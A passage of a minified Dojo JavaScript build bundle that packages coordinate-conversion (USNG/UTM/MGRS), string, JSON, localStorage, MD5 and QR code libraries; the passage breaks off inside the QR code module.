//>>built
require({cache:{"libs/usng/usng":function(){window.console||(window.console={warn:function(){}});define(["dojo/_base/declare","dojo/string"],function(y,f){var v,t,u,g=Math.PI/180,z=180/Math.PI,w,q;w=6378137;q=.006694380023;var x=q/(1-q),h=(1-Math.sqrt(1-q))/(1+Math.sqrt(1-q));return{getZoneNumber:function(b,a){b=parseFloat(b);a=parseFloat(a);(360<a||-180>a||90<b||-90>b)&&console.warn("Bad input. lat: "+b+" lon: "+a);a=a+180-360*parseInt((a+180)/360)-180;var e=parseInt((a+180)/6)+1;56<=b&&64>b&&3<=
a&&12>a&&(e=32);72<=b&&84>b&&(0<=a&&9>a?e=31:9<=a&&21>a?e=33:21<=a&&33>a?e=35:33<=a&&42>a&&(e=37));return e},LLtoUTM:function(b,a,e,n){b=parseFloat(b);a=parseFloat(a);if(84<b||-80>b)return"undefined";(360<a||-180>a||90<b||-90>b)&&console.warn("Bad input. lat: "+b+" lon: "+a);var l=a+180-360*parseInt((a+180)/360)-180,h=b*g,l=l*g;u=n?n:this.getZoneNumber(b,a);var k=(6*(u-1)-180+3)*g;this.UTMLetterDesignator(b);b=w/Math.sqrt(1-q*Math.sin(h)*Math.sin(h));a=Math.tan(h)*Math.tan(h);n=x*Math.cos(h)*Math.cos(h);
l=Math.cos(h)*(l-k);k=w*((1-q/4-3*q*q/64-5*q*q*q/256)*h-(3*q/8+3*q*q/32+45*q*q*q/1024)*Math.sin(2*h)+(15*q*q/256+45*q*q*q/1024)*Math.sin(4*h)-35*q*q*q/3072*Math.sin(6*h));v=.9996*b*(l+(1-a+n)*l*l*l/6+(5-18*a+a*a+72*n-58*x)*l*l*l*l*l/120)+5E5;t=.9996*(k+b*Math.tan(h)*(l*l/2+(5-a+9*n+4*n*n)*l*l*l*l/24+(61-58*a+a*a+600*n-330*x)*l*l*l*l*l*l/720));e[0]=v;e[1]=t;e[2]=u},LLtoUSNG:function(b,a,e){b=parseFloat(b);a=parseFloat(a);var n=[];this.LLtoUTM(b,a,n);var l=n[0],n=n[1];0>b&&(n+=1E7);var h=this.findGridLetters(u,
n,l),n=Math.round(n)%1E5,l=Math.round(l)%1E5,n=Math.floor(n/Math.pow(10,5-e)),l=Math.floor(l/Math.pow(10,5-e));b=this.getZoneNumber(b,a)+this.UTMLetterDesignator(b)+" "+h+" ";for(a=String(l).length;a<e;a++)b+="0";b+=l+" ";for(a=String(n).length;a<e;a++)b+="0";return b+n},UTMLetterDesignator:function(b){b=parseFloat(b);return 84>=b&&72<=b?"X":72>b&&64<=b?"W":64>b&&56<=b?"V":56>b&&48<=b?"U":48>b&&40<=b?"T":40>b&&32<=b?"S":32>b&&24<=b?"R":24>b&&16<=b?"Q":16>b&&8<=b?"P":8>b&&0<=b?"N":0>b&&-8<=b?"M":-8>
b&&-16<=b?"L":-16>b&&-24<=b?"K":-24>b&&-32<=b?"J":-32>b&&-40<=b?"H":-40>b&&-48<=b?"G":-48>b&&-56<=b?"F":-56>b&&-64<=b?"E":-64>b&&-72<=b?"D":-72>b&&-80<=b?"C":"Z"},findSet:function(b){b=parseInt(b);switch(b%6){case 0:return 6;case 1:return 1;case 2:return 2;case 3:return 3;case 4:return 4;case 5:return 5;default:return-1}},findGridLetters:function(b,a,e){b=parseInt(b);a=parseFloat(a);e=parseFloat(e);var n=1;for(a=Math.round(a);1E5<=a;)a-=1E5,n++;n%=20;a=0;for(e=Math.round(e);1E5<=e;)e-=1E5,a++;a%=
8;return this.lettersHelper(this.findSet(b),n,a)},lettersHelper:function(b,a,e){0===a?a=19:a--;0===e?e=7:e--;switch(b){case 1:return b="ABCDEFGHJKLMNPQRSTUV","ABCDEFGH".charAt(e)+b.charAt(a);case 2:return b="FGHJKLMNPQRSTUVABCDE","JKLMNPQR".charAt(e)+b.charAt(a);case 3:return b="ABCDEFGHJKLMNPQRSTUV","STUVWXYZ".charAt(e)+b.charAt(a);case 4:return b="FGHJKLMNPQRSTUVABCDE","ABCDEFGH".charAt(e)+b.charAt(a);case 5:return b="ABCDEFGHJKLMNPQRSTUV","JKLMNPQR".charAt(e)+b.charAt(a);case 6:return b="FGHJKLMNPQRSTUVABCDE",
"STUVWXYZ".charAt(e)+b.charAt(a)}},UTMtoLL:function(b,a,e,n){a=parseFloat(a)-5E5;b=parseFloat(b);e=parseInt(e);b=b/.9996/(w*(1-q/4-3*q*q/64-5*q*q*q/256));b=b+(3*h/2-27*h*h*h/32)*Math.sin(2*b)+(21*h*h/16-55*h*h*h*h/32)*Math.sin(4*b)+151*h*h*h/96*Math.sin(6*b);var l=w/Math.sqrt(1-q*Math.sin(b)*Math.sin(b)),g=Math.tan(b)*Math.tan(b),k=x*Math.cos(b)*Math.cos(b);a/=.9996*l;l=b-l*Math.tan(b)/(w*(1-q)/Math.pow(1-q*Math.sin(b)*Math.sin(b),1.5))*(a*a/2-(5+3*g+10*k-4*k*k-9*x)*a*a*a*a/24+(61+90*g+298*k+45*g*
g-252*x-3*k*k)*a*a*a*a*a*a/720);l*=z;a=(a-(1+2*g+k)*a*a*a/6+(5-2*k+28*g-3*k*k+8*x+24*g*g)*a*a*a*a*a/120)/Math.cos(b);a=6*(e-1)-180+3+a*z;n.lat=l;n.lon=a},USNGtoUTM:function(b,a,e,n,l,h,k){e=1+"ABCDEFGHJKLMNPQRSTUVWXYZ".indexOf(e)%8;var r="CDEFGHJKLMNPQRSTUVWX".indexOf(a);n=b%2?"ABCDEFGHJKLMNPQRSTUV".indexOf(n):"FGHJKLMNPQRSTUVABCDE".indexOf(n);n=Number([0,2,2,2,4,4,6,6,8,8,0,0,0,2,2,4,4,6,6,6][r])+n/10;n<[1.1,2,2.9,3.8,4.7,5.6,6.5,7.3,8.2,9.1,0,.8,1.7,2.6,3.5,4.4,5.3,6.2,7,7.9][r]&&(n+=2);k.N=1E6*
n+Number(h)*Math.pow(10,5-h.length);k.E=1E5*e+Number(l)*Math.pow(10,5-l.length);k.zone=b;k.letter=a},USNGtoLL:function(b,a){var e={};this.parseUSNG_str(b,e);b={};this.USNGtoUTM(e.zone,e.let,e.sq1,e.sq2,e.east,e.north,b);"N">e.let&&(b.N-=1E7);this.UTMtoLL(b.N,b.E,e.zone,b);a[0]=b.lat;a[1]=b.lon},parseUSNG_str:function(b,a){var e=0,n,l=[];n=[];n=b.toUpperCase();l=/%20/g;l=n.replace(l,"");l=/ /g;l=n.replace(l,"");if(7>l.length)return console.warn("This application requires minimum USNG precision of 10,000 meters"),
0;a.zone=10*l.charAt(e++)+1*l.charAt(e++);a.let=l.charAt(e++);a.sq1=l.charAt(e++);a.sq2=l.charAt(e++);a.precision=(l.length-e)/2;a.east="";a.north="";for(n=0;n<a.precision;n++)a.east+=l.charAt(e++);" "==l[e]&&e++;for(n=0;n<a.precision;n++)a.north+=l.charAt(e++)},isUSNG:function(b){var a=[],a=b.toUpperCase();b=/%20/g;a=a.replace(b,"");b=/ /g;a=a.replace(b,"");if(15<a.length)return 0;b=/^[0-9]{2}[CDEFGHJKLMNPQRSTUVWX]$/;if(a.match(b))return console.warn("Input appears to be a UTM zone...more precision is required to display a correct result."),
0;b=/^[0-9]{2}[CDEFGHJKLMNPQRSTUVWX][ABCDEFGHJKLMNPQRSTUVWXYZ][ABCDEFGHJKLMNPQRSTUV]([0-9][0-9]){0,5}/;return a.match(b)?7>a.length?(alert(a+" Appears to be a USNG string, but this application requires precision of at least 10,000 meters"),0):a:0},LLtoMGRS:function(b,a,e){var n="";return n=this.LLtoUSNG(b,a,e).replace(/ /g,"")},LLtoUSNG_nad27:function(b,a,e){w=6378206.4;q=.006768658;b=this.LLtoUSNG(b,a,e);w=6378137;q=.006694380023;return b+" (NAD27)"}}})},"dojo/string":function(){define(["./_base/kernel",
"./_base/lang"],function(y,f){var v=/[&<>'"\/]/g,t={"\x26":"\x26amp;","\x3c":"\x26lt;","\x3e":"\x26gt;",'"':"\x26quot;","'":"\x26#x27;","/":"\x26#x2F;"},u={};f.setObject("dojo.string",u);u.escape=function(g){return g?g.replace(v,function(g){return t[g]}):""};u.rep=function(g,f){if(0>=f||!g)return"";for(var t=[];;){f&1&&t.push(g);if(!(f>>=1))break;g+=g}return t.join("")};u.pad=function(g,f,t,q){t||(t="0");g=String(g);f=u.rep(t,Math.ceil((f-g.length)/t.length));return q?g+f:f+g};u.substitute=function(g,
t,u,q){q=q||y.global;u=u?f.hitch(q,u):function(g){return g};return g.replace(/\$\{([^\s\:\}]*)(?:\:([^\s\:\}]+))?\}/g,function(g,h,b){if(""==h)return"$";g=f.getObject(h,!1,t);b&&(g=f.getObject(b,!1,q).call(q,g,h));b=u(g,h);if("undefined"===typeof b)throw Error('string.substitute could not find key "'+h+'" in template');return b.toString()})};u.trim=String.prototype.trim?f.trim:function(g){g=g.replace(/^\s+/,"");for(var f=g.length-1;0<=f;f--)if(/\S/.test(g.charAt(f))){g=g.substring(0,f+1);break}return g};
return u})},"libs/storejs/json":function(){define(["dojo","dijit","dojox"],function(y,f,v){this.JSON||(this.JSON={});(function(){function f(a){return 10>a?"0"+a:a}function u(a){w.lastIndex=0;return w.test(a)?'"'+a.replace(w,function(e){var a=h[e];return"string"===typeof a?a:"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+a+'"'}function g(a,e){var n,l,h=q,k,r=e[a];r&&"object"===typeof r&&"function"===typeof r.toJSON&&(r=r.toJSON(a));"function"===typeof b&&(r=b.call(e,a,r));switch(typeof r){case "string":return u(r);
case "number":return isFinite(r)?String(r):"null";case "boolean":case "null":return String(r);case "object":if(!r)return"null";q+=x;k=[];if("[object Array]"===Object.prototype.toString.apply(r)){l=r.length;for(a=0;a<l;a+=1)k[a]=g(a,r)||"null";e=0===k.length?"[]":q?"[\n"+q+k.join(",\n"+q)+"\n"+h+"]":"["+k.join(",")+"]";q=h;return e}if(b&&"object"===typeof b)for(l=b.length,a=0;a<l;a+=1)n=b[a],"string"===typeof n&&(e=g(n,r))&&k.push(u(n)+(q?": ":":")+e);else for(n in r)Object.hasOwnProperty.call(r,n)&&
(e=g(n,r))&&k.push(u(n)+(q?": ":":")+e);e=0===k.length?"{}":q?"{\n"+q+k.join(",\n"+q)+"\n"+h+"}":"{"+k.join(",")+"}";q=h;return e}}"function"!==typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(a){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(a){return this.valueOf()});
var v=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,w=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,q,x,h={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},b;"function"!==typeof JSON.stringify&&(JSON.stringify=function(a,e,n){var l;x=q="";if("number"===typeof n)for(l=0;l<n;l+=1)x+=" ";else"string"===typeof n&&(x=n);if((b=e)&&"function"!==
typeof e&&("object"!==typeof e||"number"!==typeof e.length))throw Error("JSON.stringify");return g("",{"":a})});"function"!==typeof JSON.parse&&(JSON.parse=function(a,e){function n(a,b){var k,r,c=a[b];if(c&&"object"===typeof c)for(k in c)Object.hasOwnProperty.call(c,k)&&(r=n(c,k),void 0!==r?c[k]=r:delete c[k]);return e.call(a,b,c)}a=String(a);v.lastIndex=0;v.test(a)&&(a=a.replace(v,function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)}));if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,
"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return a=eval("("+a+")"),"function"===typeof e?n({"":a},""):a;throw new SyntaxError("JSON.parse");})})()})},"dijit/main":function(){define(["dojo/_base/kernel"],function(y){return y.dijit})},"dojox/main":function(){define(["dojo/_base/kernel"],function(y){return y.dojox})},"libs/storejs/store":function(){(function(y){var f={},v=y.document,t;f.disabled=!1;f.set=function(f,h){};f.get=
function(f){};f.remove=function(f){};f.clear=function(){};f.transact=function(g,h,b){var a=f.get(g);null==b&&(b=h,h=null);"undefined"==typeof a&&(a=h||{});b(a);f.set(g,a)};f.getAll=function(){};f.forEach=function(){};f.serialize=function(f){return JSON.stringify(f)};f.deserialize=function(f){if("string"==typeof f)try{return JSON.parse(f)}catch(h){return f||void 0}};var u;try{u="localStorage"in y&&y.localStorage}catch(x){u=!1}if(u)t=y.localStorage,f.set=function(g,h){if(void 0===h)return f.remove(g);
t.setItem(g,f.serialize(h));return h},f.get=function(g){return f.deserialize(t.getItem(g))},f.remove=function(f){t.removeItem(f)},f.clear=function(){t.clear()},f.getAll=function(){var g={};f.forEach(function(h,b){g[h]=b});return g},f.forEach=function(g){for(var h=0;h<t.length;h++){var b=t.key(h);g(b,f.get(b))}};else if(v.documentElement.addBehavior){var g=function(g){return g.replace(/^d/,"___$\x26").replace(q,"___")};u=function(g){return function(){var h=Array.prototype.slice.call(arguments,0);h.unshift(t);
z.appendChild(t);t.addBehavior("#default#userData");t.load("localStorage");h=g.apply(f,h);z.removeChild(t);return h}};var z,w;try{w=new ActiveXObject("htmlfile"),w.open(),w.write('\x3cscript\x3edocument.w\x3dwindow\x3c/script\x3e\x3ciframe src\x3d"/favicon.ico"\x3e\x3c/iframe\x3e'),w.close(),z=w.w.frames[0].document,t=z.createElement("div")}catch(x){t=v.createElement("div"),z=v.body}var q=/[!"#$%&'()*+,/\\:;<=>?@[\]^`{|}~]/g;f.set=u(function(q,h,b){h=g(h);if(void 0===b)return f.remove(h);q.setAttribute(h,
f.serialize(b));q.save("localStorage");return b});f.get=u(function(q,h){h=g(h);return f.deserialize(q.getAttribute(h))});f.remove=u(function(f,h){h=g(h);f.removeAttribute(h);f.save("localStorage")});f.clear=u(function(g){var h=g.XMLDocument.documentElement.attributes;g.load("localStorage");for(var b=0,a;a=h[b];b++)g.removeAttribute(a.name);g.save("localStorage")});f.getAll=function(g){var h={};f.forEach(function(b,a){h[b]=a});return h};f.forEach=u(function(g,h){for(var b=g.XMLDocument.documentElement.attributes,
a=0,e;e=b[a];++a)h(e.name,f.deserialize(g.getAttribute(e.name)))})}try{f.set("__storejs__","__storejs__"),"__storejs__"!=f.get("__storejs__")&&(f.disabled=!0),f.remove("__storejs__")}catch(x){f.disabled=!0}f.enabled=!f.disabled;"undefined"!=typeof module&&module.exports&&this.module!==module?module.exports=f:"function"===typeof define&&define.amd?define(f):y.store=f})(Function("return this")())},"libs/md5/md5":function(){(function(y){function f(e,a){var b=(e&65535)+(a&65535);return(e>>16)+(a>>16)+
(b>>16)<<16|b&65535}function v(e,a,b,g,k,r){e=f(f(a,e),f(g,r));return f(e<<k|e>>>32-k,b)}function t(e,a,b,g,k,r,c){return v(a&b|~a&g,e,a,k,r,c)}function u(e,a,b,g,k,r,c){return v(a&g|b&~g,e,a,k,r,c)}function g(e,a,b,g,k,r,c){return v(b^(a|~g),e,a,k,r,c)}function z(a,b){a[b>>5]|=128<<b%32;a[(b+64>>>9<<4)+14]=b;var e,n,k,r,c=1732584193,d=-271733879,p=-1732584194,m=271733878;for(b=0;b<a.length;b+=16)e=c,n=d,k=p,r=m,c=t(c,d,p,m,a[b],7,-680876936),m=t(m,c,d,p,a[b+1],12,-389564586),p=t(p,m,c,d,a[b+2],17,
606105819),d=t(d,p,m,c,a[b+3],22,-1044525330),c=t(c,d,p,m,a[b+4],7,-176418897),m=t(m,c,d,p,a[b+5],12,1200080426),p=t(p,m,c,d,a[b+6],17,-1473231341),d=t(d,p,m,c,a[b+7],22,-45705983),c=t(c,d,p,m,a[b+8],7,1770035416),m=t(m,c,d,p,a[b+9],12,-1958414417),p=t(p,m,c,d,a[b+10],17,-42063),d=t(d,p,m,c,a[b+11],22,-1990404162),c=t(c,d,p,m,a[b+12],7,1804603682),m=t(m,c,d,p,a[b+13],12,-40341101),p=t(p,m,c,d,a[b+14],17,-1502002290),d=t(d,p,m,c,a[b+15],22,1236535329),c=u(c,d,p,m,a[b+1],5,-165796510),m=u(m,c,d,p,a[b+
6],9,-1069501632),p=u(p,m,c,d,a[b+11],14,643717713),d=u(d,p,m,c,a[b],20,-373897302),c=u(c,d,p,m,a[b+5],5,-701558691),m=u(m,c,d,p,a[b+10],9,38016083),p=u(p,m,c,d,a[b+15],14,-660478335),d=u(d,p,m,c,a[b+4],20,-405537848),c=u(c,d,p,m,a[b+9],5,568446438),m=u(m,c,d,p,a[b+14],9,-1019803690),p=u(p,m,c,d,a[b+3],14,-187363961),d=u(d,p,m,c,a[b+8],20,1163531501),c=u(c,d,p,m,a[b+13],5,-1444681467),m=u(m,c,d,p,a[b+2],9,-51403784),p=u(p,m,c,d,a[b+7],14,1735328473),d=u(d,p,m,c,a[b+12],20,-1926607734),c=v(d^p^m,c,
d,a[b+5],4,-378558),m=v(c^d^p,m,c,a[b+8],11,-2022574463),p=v(m^c^d,p,m,a[b+11],16,1839030562),d=v(p^m^c,d,p,a[b+14],23,-35309556),c=v(d^p^m,c,d,a[b+1],4,-1530992060),m=v(c^d^p,m,c,a[b+4],11,1272893353),p=v(m^c^d,p,m,a[b+7],16,-155497632),d=v(p^m^c,d,p,a[b+10],23,-1094730640),c=v(d^p^m,c,d,a[b+13],4,681279174),m=v(c^d^p,m,c,a[b],11,-358537222),p=v(m^c^d,p,m,a[b+3],16,-722521979),d=v(p^m^c,d,p,a[b+6],23,76029189),c=v(d^p^m,c,d,a[b+9],4,-640364487),m=v(c^d^p,m,c,a[b+12],11,-421815835),p=v(m^c^d,p,m,
a[b+15],16,530742520),d=v(p^m^c,d,p,a[b+2],23,-995338651),c=g(c,d,p,m,a[b],6,-198630844),m=g(m,c,d,p,a[b+7],10,1126891415),p=g(p,m,c,d,a[b+14],15,-1416354905),d=g(d,p,m,c,a[b+5],21,-57434055),c=g(c,d,p,m,a[b+12],6,1700485571),m=g(m,c,d,p,a[b+3],10,-1894986606),p=g(p,m,c,d,a[b+10],15,-1051523),d=g(d,p,m,c,a[b+1],21,-2054922799),c=g(c,d,p,m,a[b+8],6,1873313359),m=g(m,c,d,p,a[b+15],10,-30611744),p=g(p,m,c,d,a[b+6],15,-1560198380),d=g(d,p,m,c,a[b+13],21,1309151649),c=g(c,d,p,m,a[b+4],6,-145523070),m=
g(m,c,d,p,a[b+11],10,-1120210379),p=g(p,m,c,d,a[b+2],15,718787259),d=g(d,p,m,c,a[b+9],21,-343485551),c=f(c,e),d=f(d,n),p=f(p,k),m=f(m,r);return[c,d,p,m]}function w(a){var b,e="";for(b=0;b<32*a.length;b+=8)e+=String.fromCharCode(a[b>>5]>>>b%32&255);return e}function q(a){var b,e=[];e[(a.length>>2)-1]=void 0;for(b=0;b<e.length;b+=1)e[b]=0;for(b=0;b<8*a.length;b+=8)e[b>>5]|=(a.charCodeAt(b/8)&255)<<b%32;return e}function x(a){return w(z(q(a),8*a.length))}function h(a,b){var e=q(a),g=[],k=[];g[15]=k[15]=
void 0;16<e.length&&(e=z(e,8*a.length));for(a=0;16>a;a+=1)g[a]=e[a]^909522486,k[a]=e[a]^1549556828;b=z(g.concat(q(b)),512+8*b.length);return w(z(k.concat(b),640))}function b(a){var b="",e,g;for(g=0;g<a.length;g+=1)e=a.charCodeAt(g),b+="0123456789abcdef".charAt(e>>>4&15)+"0123456789abcdef".charAt(e&15);return b}function a(a,g,f){g?f?a=h(unescape(encodeURIComponent(g)),unescape(encodeURIComponent(a))):(a=h(unescape(encodeURIComponent(g)),unescape(encodeURIComponent(a))),a=b(a)):a=f?x(unescape(encodeURIComponent(a))):
b(x(unescape(encodeURIComponent(a))));return a}"function"===typeof define&&define.amd?define(function(){return a}):y.md5=a})(this)},"libs/qrcode":function(){define(["dojo","dijit","dojox"],function(y,f,v){var t;(function(){function f(a){this.mode=h.MODE_8BIT_BYTE;this.data=a;this.parsedData=[];a=0;for(var b=this.data.length;a<b;a++){var c=[],d=this.data.charCodeAt(a);65536<d?(c[0]=240|(d&1835008)>>>18,c[1]=128|(d&258048)>>>12,c[2]=128|(d&4032)>>>6,c[3]=128|d&63):2048<d?(c[0]=224|(d&61440)>>>12,c[1]=
128|(d&4032)>>>6,c[2]=128|d&63):128<d?(c[0]=192|(d&1984)>>>6,c[1]=128|d&63):c[0]=d;this.parsedData.push(c)}this.parsedData=Array.prototype.concat.apply([],this.parsedData);this.parsedData.length!=this.data.length&&(this.parsedData.unshift(191),this.parsedData.unshift(187),this.parsedData.unshift(239))}function g(a,b){this.typeNumber=a;this.errorCorrectLevel=b;this.modules=null;this.moduleCount=0;this.dataCache=null;this.dataList=[]}function v(a,b){if(void 0==a.length)throw Error(a.length+"/"+b);for(var c=
0;c<a.length&&0==a[c];)c++;this.num=Array(a.length-c+b);for(b=0;b<a.length-c;b++)this.num[b]=a[b+c]}function w(a,b){this.totalCount=a;this.dataCount=b}function q(){this.buffer=[];this.length=0}function x(){var a=!1,b=navigator.userAgent;/android/i.test(b)&&(a=!0,(aMat=b.toString().match(/android ([0-9]\.[0-9])/i))&&aMat[1]&&(a=parseFloat(aMat[1])));return a}f.prototype={getLength:function(a){return this.parsedData.length},write:function(a){for(var b=0,c=this.parsedData.length;b<c;b++)a.put(this.parsedData[b],
8)}};g.prototype={addData:function(a){a=new f(a);this.dataList.push(a);this.dataCache=null},isDark:function(a,b){if(0>a||this.moduleCount<=a||0>b||this.moduleCount<=b)throw Error(a+","+b);return this.modules[a][b]},getModuleCount:function(){return this.moduleCount},make:function(){this.makeImpl(!1,this.getBestMaskPattern())},makeImpl:function(a,b){this.moduleCount=4*this.typeNumber+17;this.modules=Array(this.moduleCount);for(var c=0;c<this.moduleCount;c++){this.modules[c]=Array(this.moduleCount);
for(var d=0;d<this.moduleCount;d++)this.modules[c][d]=null}this.setupPositionProbePattern(0,0);this.setupPositionProbePattern(this.moduleCount-7,0);this.setupPositionProbePattern(0,this.moduleCount-7);this.setupPositionAdjustPattern();this.setupTimingPattern();this.setupTypeInfo(a,b);7<=this.typeNumber&&this.setupTypeNumber(a);null==this.dataCache&&(this.dataCache=g.createData(this.typeNumber,this.errorCorrectLevel,this.dataList));this.mapData(this.dataCache,b)},setupPositionProbePattern:function(a,
b){for(var c=-1;7>=c;c++)if(!(-1>=a+c||this.moduleCount<=a+c))for(var d=-1;7>=d;d++)-1>=b+d||this.moduleCount<=b+d||(this.modules[a+c][b+d]=0<=c&&6>=c&&(0==d||6==d)||0<=d&&6>=d&&(0==c||6==c)||2<=c&&4>=c&&2<=d&&4>=d?!0:!1)},getBestMaskPattern:function(){for(var b=0,r=0,c=0;8>c;c++){this.makeImpl(!0,c);var d=a.getLostPoint(this);if(0==c||b>d)b=d,r=c}return r},createMovieClip:function(a,b,c){a=a.createEmptyMovieClip(b,c);this.make();for(b=0;b<this.modules.length;b++){c=1*b;for(var d=0;d<this.modules[b].length;d++){var k=
1*d;this.modules[b][d]&&(a.beginFill(0,100),a.moveTo(k,c),a.lineTo(k+1,c),a.lineTo(k+1,c+1),a.lineTo(k,c+1),a.endFill())}}return a},setupTimingPattern:function(){for(var a=8;a<this.moduleCount-8;a++)null==this.modules[a][6]&&(this.modules[a][6]=0==a%2);for(a=8;a<this.moduleCount-8;a++)null==this.modules[6][a]&&(this.modules[6][a]=0==a%2)},setupPositionAdjustPattern:function(){for(var b=a.getPatternPosition(this.typeNumber),r=0;r<b.length;r++)for(var c=0;c<b.length;c++){var d=b[r],p=b[c];if(null==
this.modules[d][p])for(var m=-2;2>=m;m++)for(var e=-2;2>=e;e++)this.modules[d+m][p+e]=-2==m||2==m||-2==e||2==e||0==m&&0==e?!0:!1}},setupTypeNumber:function(b){for(var k=a.getBCHTypeNumber(this.typeNumber),c=0;18>c;c++){var d=!b&&1==(k>>c&1);this.modules[Math.floor(c/3)][c%3+this.moduleCount-8-3]=d}for(c=0;18>c;c++)d=!b&&1==(k>>c&1),this.modules[c%3+this.moduleCount-8-3][Math.floor(c/3)]=d},setupTypeInfo:function(b,r){r=a.getBCHTypeInfo(this.errorCorrectLevel<<3|r);for(var c=0;15>c;c++){var d=!b&&
1==(r>>c&1);6>c?this.modules[c][8]=d:8>c?this.modules[c+1][8]=d:this.modules[this.moduleCount-15+c][8]=d}for(c=0;15>c;c++)d=!b&&1==(r>>c&1),8>c?this.modules[8][this.moduleCount-c-1]=d:9>c?this.modules[8][15-c-1+1]=d:this.modules[8][15-c-1]=d;this.modules[this.moduleCount-8][8]=!b},mapData:function(b,r){for(var c=-1,d=this.moduleCount-1,k=7,e=0,g=this.moduleCount-1;0<g;g-=2)for(6==g&&g--;;){for(var f=0;2>f;f++)if(null==this.modules[d][g-f]){var h=!1;e<b.length&&(h=1==(b[e]>>>k&1));a.getMask(r,d,g-
f)&&(h=!h);this.modules[d][g-f]=h;k--; -1==k&&(e++,k=7)}d+=c;if(0>d||this.moduleCount<=d){d-=c;c=-c;break}}}};g.PAD0=236;g.PAD1=17;g.createData=function(b,r,c){r=w.getRSBlocks(b,r);for(var d=new q,k=0;k<c.length;k++){var e=c[k];d.put(e.mode,4);d.put(e.getLength(),a.getLengthInBits(e.mode,b));e.write(d)}for(k=b=0;k<r.length;k++)b+=r[k].dataCount;if(d.getLengthInBits()>8*b)throw Error("code length overflow. ("+d.getLengthInBits()+"\x3e"+8*b+")");for(d.getLengthInBits()+4<=8*b&&d.put(0,4);0!=d.getLengthInBits()%
8;)d.putBit(!1);for(;!(d.getLengthInBits()>=8*b);){d.put(g.PAD0,8);if(d.getLengthInBits()>=8*b)break;d.put(g.PAD1,8)}return g.createBytes(d,r)};g.createBytes=function(b,e){for(var c=0,d=0,k=0,r=Array(e.length),g=Array(e.length),f=0;f<e.length;f++){var h=e[f].dataCount,n=e[f].totalCount-h,d=Math.max(d,h),k=Math.max(k,n);r[f]=Array(h);for(var l=0;l<r[f].length;l++)r[f][l]=255&b.buffer[l+c];c+=h;l=a.getErrorCorrectPolynomial(n);h=(new v(r[f],l.getLength()-1)).mod(l);g[f]=Array(l.getLength()-1);for(l=
0;l<g[f].length;l++)n=l+h.getLength()-g[f].length,g[f][l]=0<=n?h.get(n):0}for(l=f=0;l<e.length;l++)f+=e[l].totalCount;b=Array(f);for(l=c=0;l<d;l++)for(f=0;f<e.length;f++)l<r[f].length&&(b[c++]=r[f][l]);for(l=0;l<k;l++)for(f=0;f<e.length;f++)l<g[f].length&&(b[c++]=g[f][l]);return b};for(var h={MODE_NUMBER:1,MODE_ALPHA_NUM:2,MODE_8BIT_BYTE:4,MODE_KANJI:8},b={L:1,M:0,Q:3,H:2},a={PATTERN_POSITION_TABLE:[[],[6,18],[6,22],[6,26],[6,30],[6,34],[6,22,38],[6,24,42],[6,26,46],[6,28,50],[6,30,54],[6,32,58],
[6,34,62],[6,26,46,66],[6,26,48,70],[6,26,50,74],[6,30,54,78],[6,30,56,82],[6,30,58,86],[6,34,62,90],[6,28,50,72,94],[6,26,50,74,98],[6,30,54,78,102],[6,28,54,80,106],[6,32,58,84,110],[6,30,58,86,114],[6,34,62,90,118],[6,26,50,74,98,122],[6,30,54,78,102,126],[6,26,52,78,104,130],[6,30,56,82,108,134],[6,34,60,86,112,138],[6,30,58,86,114,142],[6,34,62,90,118,146],[6,30,54,78,102,126,150],[6,24,50,76,102,128,154],[6,28,54,80,106,132,158],[6,32,58,84,110,136,162],[6,26,54,82,110,138,166],[6,30,58,86,
114,142,170]],G15:1335,G18:7973,G15_MASK:21522,getBCHTypeInfo:function(b){for(var k=b<<10;0<=a.getBCHDigit(k)-a.getBCHDigit(a.G15);)k^=a.G15<<a.getBCHDigit(k)-a.getBCHDigit(a.G15);return(b<<10|k)^a.G15_MASK},getBCHTypeNumber:function(b){for(var k=b<<12;0<=a.getBCHDigit(k)-a.getBCHDigit(a.G18);)k^=a.G18<<a.getBCHDigit(k)-a.getBCHDigit(a.G18);return b<<12|k},getBCHDigit:function(a){for(var b=0;0!=a;)b++,a>>>=1;return b},getPatternPosition:function(b){return a.PATTERN_POSITION_TABLE[b-1]},getMask:function(b,
a,c){switch(b){case 0:return 0==(a+c)%2;case 1:return 0==a%2;case 2:return 0==c%3;case 3:return 0==(a+c)%3;case 4:return 0==(Math.floor(a/2)+Math.floor(c/3))%2;case 5:return 0==a*c%2+a*c%3;case 6:return 0==(a*c%2+a*c%3)%2;case 7:return 0==(a*c%3+(a+c)%2)%2;default:throw Error("bad maskPattern:"+b);}},getErrorCorrectPolynomial:function(a){for(var b=new v([1],0),c=0;c<a;c++)b=b.multiply(new v([1,e.gexp(c)],0));return b},getLengthInBits:function(a,b){if(1<=b&&10>b)switch(a){case h.MODE_NUMBER:return 10;
case h.MODE_ALPHA_NUM:return 9;case h.MODE_8BIT_BYTE:return 8;case h.MODE_KANJI:return 8;default:throw Error("mode:"+a);}else if(27>b)switch(a){case h.MODE_NUMBER:return 12;case h.MODE_ALPHA_NUM:return 11;case h.MODE_8BIT_BYTE:return 16;case h.MODE_KANJI:return 10;default:throw Error("mode:"+a);}else if(41>b)switch(a){case h.MODE_NUMBER:return 14;case h.MODE_ALPHA_NUM:return 13;case h.MODE_8BIT_BYTE:return 16;case h.MODE_KANJI:return 12;default:throw Error("mode:"+a);}else throw Error("type:"+b);
